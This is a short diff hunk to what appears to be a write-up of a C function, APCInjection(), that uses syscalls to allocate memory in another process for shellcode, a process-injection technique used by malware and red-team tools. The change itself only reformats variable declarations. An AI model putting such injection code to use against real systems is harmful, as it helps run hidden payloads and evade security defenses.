@@ -330,10 +330,10 @@ The function `APCInjection()` is actually just a syscall equivalent of the class
 ```c
 BOOL APCInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
 
-	SIZE_T		sNumberOfBytesWritten		= 0,
-				sSize						= sSizeOfShellcode;
-	ULONG		uOldProtection				= 0;
-	NTSTATUS	STATUS						= 0x00;
+	SIZE_T	sNumberOfBytesWritten = 0,
+			sSize = sSizeOfShellcode;
+	ULONG uOldProtection = 0;
+	NTSTATUS STATUS = 0x00;
 
 	if ((STATUS = NTAVM(hProcess, ppAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
 
